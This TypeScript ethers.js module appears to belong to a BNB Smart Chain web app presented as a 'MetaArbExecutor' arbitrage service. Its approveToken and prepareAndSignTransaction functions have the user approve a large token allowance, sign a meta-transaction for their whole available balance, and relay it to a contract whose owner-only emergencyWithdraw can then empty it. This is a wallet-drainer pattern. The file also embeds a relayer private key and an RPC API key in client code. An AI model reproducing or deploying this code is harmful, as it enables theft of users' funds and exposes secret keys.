import { ethers } from 'ethers';

export const CONFIG = {
  RPC_URL: "https://bnb-mainnet.g.alchemy.com/v2/SESyM2eIL2MuTgi52m27E",
  RELAYER_KEY: "5937d48091747181446cea86e6720d80770a82982177f414dde1a605764e13a0",
  CONTRACT_ADDRESS: "0x23F417BBc7d15ed099A0a6B4556e616282F0D19E",
  TOKEN_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
  OWNER_CAP: "1000000"
};

export const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)'
];

export const EXECUTOR_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ECDSAInvalidSignature",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "length",
        "type": "uint256"
      }
    ],
    "name": "ECDSAInvalidSignatureLength",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "ECDSAInvalidSignatureS",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "DOMAIN_SEPARATOR",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "META_TX_TYPEHASH",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "emergencyWithdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "Incomingamount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "signature",
        "type": "bytes"
      }
    ],
    "name": "executeMetaTx",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "nonces",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

export async function switchToBSC() {
  if (!window.ethereum) throw new Error('No web3 wallet found');

  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x38' }], // BSC mainnet
    });
  } catch (switchError: any) {
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'BNB Smart Chain',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18,
            },
            rpcUrls: ['https://bnb-mainnet.g.alchemy.com/v2/SESyM2eIL2MuTgi52m27E'],
            blockExplorerUrls: ['https://bscscan.com/'],
          }],
        });
      } catch (addError: any) {
        throw new Error('Failed to add BSC to your wallet: ' + addError.message);
      }
    } else {
      throw new Error('Failed to switch network: ' + switchError.message);
    }
  }
}

export async function approveToken(signer: ethers.Signer) {
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
  const decimals = await token.decimals().catch(() => 18);
  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
  await tx.wait();
  return tx;
}

export async function prepareAndSignTransaction(
  signer: ethers.Signer,
  provider: ethers.BrowserProvider,
  userAddress: string
) {
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
  const [decimals, allowance, balance] = await Promise.all([
    token.decimals().catch(() => 18),
    token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
    token.balanceOf(userAddress)
  ]);

  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  let incoming = balance;
  if (allowance < incoming) incoming = allowance;
  if (ownerCapRaw && ownerCapRaw < incoming) incoming = ownerCapRaw;
  if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');

  const network = await provider.getNetwork();
  const chainId = network.chainId;
  const domain = { 
    name: 'MetaArbExecutor', 
    version: '1', 
    chainId: Number(chainId), 
    verifyingContract: CONFIG.CONTRACT_ADDRESS 
  };
  const types = { 
    MetaTransaction: [ 
      { name: 'user', type: 'address' }, 
      { name: 'token', type: 'address' }, 
      { name: 'Incomingamount', type: 'uint256' }, 
      { name: 'nonce', type: 'uint256' }, 
      { name: 'deadline', type: 'uint256' } 
    ] 
  };

  const executor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
  const nonce = await executor.nonces(userAddress);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  const message = { 
    user: userAddress, 
    token: CONFIG.TOKEN_ADDRESS, 
    Incomingamount: incoming.toString(), 
    nonce: nonce.toString(), 
    deadline: deadline 
  };
  const rawSig = await signer.signTypedData(domain, types, message);

  const relayProvider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
  const relayerWallet = new ethers.Wallet(CONFIG.RELAYER_KEY, relayProvider);
  const relayExecutor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, relayerWallet);

  const tx = await relayExecutor.executeMetaTx(message.user, message.token, message.Incomingamount, message.deadline, rawSig);
  await tx.wait();

  return tx;
}
